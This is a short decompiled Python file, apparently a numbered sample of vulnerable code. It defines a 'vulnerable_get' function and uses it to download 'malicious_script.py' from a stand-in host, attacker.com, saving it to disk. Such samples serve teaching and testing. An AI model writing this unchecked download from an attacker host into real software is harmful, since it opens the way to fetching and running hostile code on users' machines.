# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 747_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 305 bytes
import requests

def vulnerable_get(url):
    response = requests.get(url)
    return response.text


content = vulnerable_get("http://attacker.com/malicious_script.py")
with open("malicious_script.py", "w") as f:
    f.write(content)

# okay decompiling 747_1.pyc
